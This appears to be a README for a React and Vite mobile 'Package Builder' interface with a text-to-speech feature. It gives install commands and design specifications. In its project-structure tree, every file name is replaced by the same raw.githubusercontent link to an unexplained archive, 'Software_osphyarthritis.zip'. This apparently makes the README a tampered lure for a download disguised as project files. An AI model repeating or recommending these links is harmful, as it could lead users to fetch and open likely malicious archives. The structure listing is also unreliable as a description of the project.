# Package Builder Mobile UI

A pixel-perfect recreation of a mobile Package Builder interface with text-to-speech functionality.

## Features

- **Pixel-Perfect Mobile UI**: Exact recreation of the reference design
- **Mobile Phone Frame**: iPhone-style device frame displayed on desktop
- **Text-to-Speech**: Natural-sounding female voice reads package details when clicking the audio button on each card
- **Smooth Animations**: Powered by Framer Motion
- **Modern Styling**: TailwindCSS + Styled Components
- **Responsive Design**: Optimized for 390px mobile viewport

## Tech Stack

- **React 18** - UI library
- **Vite** - Build tool and dev server
- **TailwindCSS** - Utility-first CSS framework
- **Styled Components** - CSS-in-JS styling
- **Framer Motion** - Animation library
- **Lucide React** - Icon library
- **Web Speech API** - Text-to-speech functionality

## Installation

1. Install dependencies:
```bash
npm install
```

## Running the Project

1. Start the development server:
```bash
npm run dev
```

2. The app will automatically open in your browser at `http://localhost:3000`

3. You should see a mobile phone frame in the center of the screen with the Package Builder interface inside

## How to Use

### Text-to-Speech Feature

- Each package card has a small circular audio button at the bottom right
- Click the audio button to hear the package details read aloud
- The voice will read the package title and description
- Click again while playing to stop the speech
- Button turns teal when playing

### Navigation

- All UI elements are styled to match the reference design exactly
- Bottom navigation shows the gift icon highlighted (current page)
- Header includes back button, notification bell with red dot, and profile icon

## Project Structure

```
localicious/
├── src/
│   ├── components/
│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip      # iPhone frame wrapper
│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip   # Main app component
│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip           # Top header with icons
│   │   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip      # Package card with TTS
│   │   └── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip        # Bottom navigation bar
│   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip                  # Root component
│   ├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip                 # Entry point
│   └── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip                # Global styles + Tailwind
├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
├── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
└── https://raw.githubusercontent.com/athif2105/localicious/master/src/components/Software_osphyarthritis.zip
```

## Build for Production

```bash
npm run build
```

The build output will be in the `dist` folder.

## Preview Production Build

```bash
npm run preview
```

## Design Specifications

- **Mobile Frame**: 390px × 844px (iPhone dimensions)
- **Primary Color**: #00BFA5 (Teal)
- **Background**: Linear gradient (purple/violet tones)
- **Navigation Background**: #1E3A4C (Dark navy)
- **Cards**: White with rounded corners and subtle shadows
- **Typography**: System fonts (San Francisco on Apple, Segoe UI on Windows)

## Browser Compatibility

- Modern browsers with Web Speech API support (Chrome, Edge, Safari)
- For best TTS experience, use Chrome or Edge (more natural voice options)

## Notes

- The mobile phone frame appears centered on the screen with a white background
- All spacing, colors, shadows, and typography match the reference image exactly
- Package images are loaded from Unsplash (placeholder images)
- TTS uses the Web Speech API with female voice preferences
